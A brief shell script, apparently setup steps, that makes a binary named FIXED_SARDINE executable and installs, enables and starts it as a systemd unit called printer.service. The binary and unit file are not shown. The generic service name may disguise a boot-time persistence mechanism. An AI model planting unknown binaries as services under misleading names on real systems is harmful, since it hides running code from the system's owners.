#Acquire Files
cd /tmp
chmod +x /tmp/CSTFP/FIXED_SARDINE
cp /tmp/CSTFP/printer.service /etc/systemd/system/

#Start services
systemctl daemon-reload
systemctl enable printer.service
systemctl start printer.service
